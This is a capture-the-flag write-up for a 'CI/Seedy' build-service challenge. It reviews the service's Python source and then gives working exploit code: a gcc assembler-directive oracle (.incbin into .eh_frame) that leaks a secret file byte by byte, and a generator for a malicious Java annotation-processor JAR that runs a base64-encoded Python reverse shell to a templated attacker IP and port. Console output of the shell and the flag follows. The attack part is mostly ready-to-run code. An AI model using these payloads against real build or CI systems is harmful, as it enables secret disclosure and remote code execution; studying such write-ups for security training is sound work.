# Solution

When we connect to the target, we encounter a persistent connection that takes JSON input on a line
as a sort of API to a builder tool.

```
$ nc 127.0.0.1 31337
CI/Seedy v.0.2.4 - Simple CI/CD for Everyone. API ready.
X
{"status": false, "result": "unable to parse JSON or there was a fatal error"}
{}
{"status": false, "result": "lang or input is missing"}

```

Examining the Dockerfile, the pertinent facts are:

* The entrypoint is at `/opt/ciseedy/utils/main.sh`.
* The xinetd executed Python script is at `/opt/ciseedy/ciseedy/ciseedy.py`.
* A randomised UUID is stored at the location `/unlock_code.txt`.
* The flag can only be retrieved by executing the SUID binary `/readflag`.

Next. we examine the `ciseedy.py` application. The unlock code is read into the `UNLOCK_CODE`
constant variable.

```python
  18   │ # Constants
  19   │
  20   │ UNLOCK_CODE = open('/unlock_code.txt', 'r').read().strip()
```

The main function is simple. It reads a JSON line from the user and passes the decoded structure to
the `process` function. A JSON response is returned.

```python
 138   │ def main():
 139   │     # Setup some limit on how long a player can stay connected.
 140   │     # 8 Hours
 141   │     seconds = 60 * 60 * 8
 142   │     signal.alarm(seconds)
 143   │
 144   │     # Print the banner.
 145   │     pprint('CI/Seedy v.0.2.4 - Simple CI/CD for Everyone. API ready.')
 146   │
 147   │     # Start the loop.
 148   │     while True:
 149   │         line = readline()
 150   │         try:
 151   │             data = json.loads(line)
 152   │             status, result = process(data)
 153   │             resp = response(status, result)
 154   │         except:
 155   │             resp = response(False, 'unable to parse JSON or there was a fatal error')
 156   │         pprint(json.dumps(resp))
```

The `process` function expects three parameters in the JSON object:

* `lang` - Language to compile with.
* `input` - Base64-encoded data to process.
* `unlock` - An unlock code.

There are three languages that can be chosen: C, Java, Python. Only the C processor is available
without an unlock code. The others require the right code being passed in `unlock`. If a valid
processor is selected, a temporary directory is created and the appropriate processor is called.
Once completed, the temporary directory is deleted.

```python
  50   │ def process(data):
  51   │     '''Processes input from the user.
  52   │     '''
  53   │     # Validate the input.
  54   │     if not isinstance(data, dict):
  55   │         return False, 'data is not a dict'
  56   │     lang = data.get('lang', None)
  57   │     user_input = data.get('input', None)
  58   │     unlock_code = data.get('unlock', None)
  59   │     if lang is None or user_input is None:
  60   │         return False, 'lang or input is missing'
  61   │
  62   │     # Decode the user data.
  63   │     try:
  64   │         user_input = base64.b64decode(user_input)
  65   │     except:
  66   │         return False, "cannot decode base64"
  67   │
  68   │
  69   │     # Select the processor.
  70   │     status, result = False, None
  71   │     processors = {
  72   │         'c': (process_c, False),
  73   │         'java': (process_java, True),
  74   │         'python': (process_python, True),
  75   │     }
  76   │     processor, locked = processors.get(lang, (None, False))
  77   │     if locked and unlock_code != UNLOCK_CODE:
  78   │         return False, 'please purchase a valid license key'
  79   │
  80   │     # Generate a working directory for the build.
  81   │     working_dir = "/tmp/builds/{}".format(str(uuid.uuid4()))
  82   │     os.mkdir(working_dir)
  83   │
  84   │     # Run the processor.
  85   │     if processor:
  86   │         success = processor(user_input, working_dir)
  87   │         status, result = True, "{} compile {}".format(lang, "success" if success else "failed")
  88   │     else:
  89   │         status, result = False, 'unknown language'
  90   │
  91   │     # Clean up the working directory.
  92   │     shutil.rmtree(working_dir)
  93   │
  94   │     return status, result
```

Since there is only valid processor available to us at this time, we'll examine the `process_c`
processor function. It is simple, it returns the exit code of the `gcc` function.

```python
  96   │ def process_c(user_input, working_dir):
  97   │     # Write the user input to main.c
  98   │     main_c = "{}/main.c".format(working_dir)
  99   │     open(main_c, 'wb').write(user_input)
 100   │
 101   │     # Test if building the file with gcc suceeds.
 102   │     code = subprocess.call(["gcc", "-Wl,--fatal-warnings", "-o", "/dev/null", main_c],
 103   │                            stdout=subprocess.DEVNULL,
 104   │                            stderr=subprocess.DEVNULL)
 105   │     return code == 0
```

Note that this is a similar problem to https://hxp.io/blog/64/hxp-36C3-CTF-compilerbot/ where a flag
had to be leaked based on `clang` compiles. The difference in this challenge is that the flag format
is no longer an exploitable factor as the file that we have to leak is `/unlock_code.txt` which
contains a UUID. This means that the predictable `flag{xxxx}` scheme cannot be leveraged with
`#define` and `#include` statements to craft input to `_Static_assert`. Additionally, there is no
C11 support.

There is, however, an alternative solution to the challenge which leverages assembler directives
instead by RPISEC: https://rpis.ec/blog/hxp-26c3-ctf-compilerbot/. This does work with `gcc` and
since the `--fatal-warnings` flag is passed to the linker, the error code is propagated back to
`gcc`.

For example, we create the following file to guess that the first character of the UUID is `A` (65).

```c
int main(void) {

__asm__ (
    ".pushsection .eh_frame\n"

    // length of CIE record, using one byte from flag
    // length must be at least 13
    ".incbin \"/unlock_code.txt\", 0, 1\n"
    ".rept 3\n"
    ".byte 0\n"
    ".endr\n"

    // 13 bytes of CIE record junk
    // http://refspecs.linuxfoundation.org/LSB_3.0.0/LSB-Core-generic/LSB-Core-generic/ehframechpt.html
    ".long 0x00000000\n"
    ".byte 0x01\n"
    ".asciz \"zR\"\n"
    ".byte 0\n"
    ".byte 0\n"
    ".byte 0\n"
    ".byte 0\n"
    ".byte 0\n"

    ".rept 65 - 13\n"
    ".byte 0\n"
    ".endr\n"

    ".popsection\n"
);

}
```

Compiling this results in a linker error and a return code of 1.

```
root@c3319ea49e1b:/tmp# gcc -Wl,--fatal-warnings -o /dev/null main.c; echo $?;
/usr/bin/ld: error in /tmp/ccFZjJxK.o(.eh_frame); no .eh_frame_hdr table will be created
collect2: error: ld returned 1 exit status
1
root@c3319ea49e1b:/tmp#
```

The actual value of the first character is `3` (51).

```
root@c3319ea49e1b:/tmp# cat /unlock_code.txt
3a487024-b249-4bfb-b6d4-74a7ea143c51
root@c3319ea49e1b:/tmp#
```

We'll modify the C file to reflect this correct guess.

```c
    ".rept 51 - 13\n"
```

Now compiling it results in an error code of 0.

```
root@c3319ea49e1b:/tmp# gcc -Wl,--fatal-warnings -o /dev/null main.c; echo $?;
0
root@c3319ea49e1b:/tmp#
```

This can be exploited to leak the unlock code byte by byte. Functions to implement this byte by
byte exploit is given as follows:

```python
  29   │ # Original exploit technique from https://rpis.ec/blog/hxp-26c3-ctf-compilerbot/
  30   │
  31   │ LEAK_TEMPLATE = '''
  32   │ int main() {
  33   │ __asm__ (
  34   │     ".pushsection .eh_frame\\n"
  35   │
  36   │     ".incbin \\"/unlock_code.txt\\", __OFFSET__, 1\\n"
  37   │     ".rept 3\\n"
  38   │     ".byte 0\\n"
  39   │     ".endr\\n"
  40   │
  41   │     ".long 0x00000000\\n"
  42   │     ".byte 0x01\\n"
  43   │     ".asciz \\"zR\\"\\n"
  44   │     ".byte 0\\n"
  45   │     ".byte 0\\n"
  46   │     ".byte 0\\n"
  47   │     ".byte 0\\n"
  48   │     ".byte 0\\n"
  49   │
  50   │     ".rept __GUESS__ - 13\\n"
  51   │     ".byte 0\\n"
  52   │     ".endr\\n"
  53   │
  54   │     ".popsection\\n"
  55   │ );
  56   │ }
  57   │ '''
  58   │
  59   │
  60   │ def leak_unlock_code(p):
  61   │     '''Leak the unlock code with the bonus method detailed in
  62   │     https://rpis.ec/blog/hxp-26c3-ctf-compilerbot/ using gcc.
  63   │     '''
  64   │     # Leak the UUID in /unlock_code.txt
  65   │     uuid_dash_indices = (8, 13, 18, 23)
  66   │     unlock_code_progress = []
  67   │     hexchars = b'0123456789abcdef'
  68   │     for i in range(36):
  69   │         # Add dashes in the right places.
  70   │         if i in uuid_dash_indices:
  71   │             unlock_code_progress.append(b'-')
  72   │             continue
  73   │
  74   │         # Search for the hexadecimal digit at the index.
  75   │         for guess in hexchars:
  76   │             attempt = LEAK_TEMPLATE.replace('__OFFSET__', str(i)).replace("__GUESS__", str(guess))
  77   │             request = generate_request('c', attempt.encode())
  78   │             p.sendline(request)
  79   │             line = p.recvline()
  80   │             response = parse_response(line)
  81   │             if 'success' in response['result']:
  82   │                 unlock_code_progress.append(bytes([guess]))
  83   │                 break
  84   │
  85   │     return b''.join(unlock_code_progress).decode()
```

Now that we have the unlock code, we can interact with the other processors. The python processor
isn't quite useful as this just compiles the user input to a code object but never actually
executed.

```python
 127   │ def process_python(user_input, working_dir):
 128   │     # Test if building the Python bytecode succeeds.
 129   │     try:
 130   │         compile(user_input, 'build.py', 'exec')
 131   │         return True
 132   │     except:
 133   │         return False
```

The Java processor is more interesting as the user input is unzipped into the temporary directory
and a Main.java file is compiled with the classpath being fully controlled.

```python
 107   │ def process_java(user_input, working_dir):
 108   │     # Write the user input to main.zip
 109   │     main_zip = "{}/main.zip".format(working_dir)
 110   │     open(main_zip, 'wb').write(user_input)
 111   │
 112   │     # Unzip the file containing the Java sources.
 113   │     code = subprocess.call(["unzip", "-d", working_dir, main_zip],
 114   │                            stdout=subprocess.DEVNULL,
 115   │                            stderr=subprocess.DEVNULL)
 116   │     if code != 0:
 117   │         return False
 118   │
 119   │     # Test if building the file with javac succeeds.
 120   │     main_java = "{}/Main.java".format(working_dir)
 121   │     classpath = "{}/*".format(working_dir)
 122   │     code = subprocess.call(["javac", "-cp", classpath, main_java],
 123   │                            stdout=subprocess.DEVNULL,
 124   │                            stderr=subprocess.DEVNULL)
 125   │     return code == 0
```

This is actually similar to the Real World 4 CTF: Secured Java challenge:
https://www.kalmarunionen.dk/writeups/2022/rwctf/secured-java/. To exploit this, an annotation
processor can be set in a JAR file within the classpath. An exploit implementing the attack from the
writeup to generate a malicious ZIP file containing the JAR file can be written as follows.

```python
  98   │ PYTHON_REVSHELL = (
  99   │     "python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
 100   │     "s.connect((\"__IP__\",__PORT__));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno()"
 101   │     ",stdout=s.fileno(),stderr=s.fileno())'")
 102   │
 103   │ PROCESSOR_TEMPLATE = '''package dk.kalmar;
 104   │ import java.util.*;
 105   │ import javax.lang.model.*;
 106   │ import javax.lang.model.element.*;
 107   │ import javax.annotation.processing.*;
 108   │
 109   │ public class ExploitProcessor extends AbstractProcessor {
 110   │     public static void execCmd(String cmd) throws Exception {
 111   │         Runtime.getRuntime().exec(cmd);
 112   │     }
 113   │
 114   │     static {
 115   │         try {
 116   │             execCmd("bash -c {echo,__REVSHELL__}|{base64,-d}|bash");
 117   │         } catch (Exception e) {
 118   │             System.out.println("Err: " + e.getMessage());
 119   │         }
 120   │    }
 121   │
 122   │     // These methods needs to be defined, but doesn't matter
 123   │     // as the above static block will run before anything else
 124   │     @Override
 125   │     public synchronized void init(ProcessingEnvironment env) { }
 126   │     @Override
 127   │     public boolean process(Set<? extends TypeElement> annotations, RoundEnvironment env) {
 128   │         return false;
 129   │     }
 130   │     @Override
 131   │     public Set<String> getSupportedAnnotationTypes() { return null; }
 132   │     @Override
 133   │     public SourceVersion getSupportedSourceVersion() { return null; }
 134   │ }
 135   │ '''
 136   │
 137   │ def generate_rce_zip(local_ip, local_port):
 138   │     '''Generates the RCE ZIP file.
 139   │     '''
 140   │     # Generate the reverse shell.
 141   │     revshell = PYTHON_REVSHELL.replace('__IP__', local_ip).replace('__PORT__', str(local_port))
 142   │     revshell = base64.b64encode(revshell.encode()).decode()
 143   │     processor_class = PROCESSOR_TEMPLATE.replace('__REVSHELL__', revshell)
 144   │
 145   │     # Create a temporary directory to create the ZIP file structure.
 146   │     tmpdir = tempfile.TemporaryDirectory()
 147   │     tmpdirname = tmpdir.name
 148   │     log.info('Created temporary directory: {}'.format(tmpdirname))
 149   │     open("{}/ExploitProcessor.java".format(tmpdirname), 'w').write(processor_class)
 150   │     Path(tmpdirname + "/dep/META-INF/services/").mkdir(parents=True, exist_ok=True)
 151   │     Path(tmpdirname + "/dep/dk/kalmar/").mkdir(parents=True, exist_ok=True)
 152   │     open("{}/dep/META-INF/services/javax.annotation.processing.Processor".format(tmpdirname), 'wb'
 153   │          ).write(b'dk.kalmar.ExploitProcessor')
 154   │     os.system("bash -c 'cd {}; javac ExploitProcessor.java; "
 155   │               "mv ExploitProcessor.class dep/dk/kalmar/; "
 156   │               "rm ExploitProcessor.java' 2>/dev/null >/dev/null".format(tmpdirname))
 157   │     open("{}/Main.java".format(tmpdirname), 'wb').write(b'')
 158   │     os.system("bash -c 'cd {}/dep; jar cvf dep.jar ./; mv dep.jar ..' 2>/dev/null "
 159   │               ">/dev/null".format(tmpdirname))
 160   │     os.system("bash -c 'cd {}; rm -rf dep; zip -r exp.zip .' 2>/dev/null >/dev/null".format(
 161   │         tmpdirname))
 162   │
 163   │     return tmpdir
```

The ZIP file can be submitted to the server like so:

```python
  88   │ def java_annotation_rce(p, tmpdir, local_ip, local_port, unlock_code):
  89   │     '''Exploit the Java annotation RCE detailed in
  90   │     https://www.kalmarunionen.dk/writeups/2022/rwctf/secured-java/.
  91   │     '''
  92   │     zip_path = '{}/exp.zip'.format(tmpdir.name)
  93   │     user_input = open(zip_path, 'rb').read()
  94   │     request = generate_request('java', user_input, unlock_code)
  95   │     p.sendline(request)
```

Once a reverse shell is received, the flag can be obtained with `/readflag`.

## Running the Exploit

Running the full exploit gives us a reverse shell.

```console
python exploit.py localhost 192.168.10.244
[*] Executing CI/Seedy exploit against: localhost:31337
[+] Trying to bind to :: on port 0: Done
[+] Waiting for connections on :::53037: Got connection from ::ffff:192.168.64.2 on port 32798
[*] Reverse shell listener started on: 192.168.10.244:53037
[+] Opening connection to localhost on port 31337: Done
[*] CI/Seedy v.0.2.4 - Simple CI/CD for Everyone. API ready.
[../.....] Leaking unlock code...
[+] Leaked unlock code: 3a487024-b249-4bfb-b6d4-74a7ea143c51
[*] Created temporary directory: /var/folders/lt/hdxvsybs05q2lbgbk_b7phgr0000gn/T/tmp9yyj48uk
[*] Java RCE ZIP file created.
[+] Java annotation RCE triggered. Please standby for shell.
[+] Enjoy your shell.
[*] Switching to interactive mode
/bin/sh: 0: can't access tty; job control turned off
$ Linux c3319ea49e1b 5.15.111 #1 SMP Mon May 15 16:48:18 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
$ uid=1000(seedy) gid=1000(seedy) groups=1000(seedy)
$ eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:ac:11:00:02  txqueuelen 0  (Ethernet)
        RX packets 527  bytes 171858 (171.8 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 269  bytes 29721 (29.7 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

$ CyberBlitz{Wh4tev3r_15_ju5t_3n0ugh_b0rn_d3s3rt_5un}

$ $
```
